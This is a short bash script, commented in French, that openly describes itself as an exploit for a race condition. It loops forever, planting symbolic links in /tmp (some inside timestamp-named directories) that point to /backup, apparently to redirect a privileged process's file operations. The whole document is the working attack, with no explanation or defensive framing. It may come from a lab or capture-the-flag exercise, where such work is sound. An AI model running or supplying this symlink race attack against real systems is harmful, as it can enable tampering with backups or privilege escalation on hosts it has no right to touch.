#!/bin/bash
# Script qui tente d'exploiter la race condition

echo "[+] Démarrage de l'exploitation par race condition"

# Boucle à exécuter en continu
while true; do
    # Créer un lien symbolique dans /tmp qui pointe vers /backup
    ln -sf /backup /tmp/backup_link 2>/dev/null
    
    # Tentative alternative
    DATE=$(date +%s)
    if mkdir /tmp/$DATE 2>/dev/null; then
        ln -sf /backup /tmp/$DATE/backup_link 2>/dev/null
    fi
    
    # Pause courte pour ne pas surcharger le système
    sleep 0.2
done
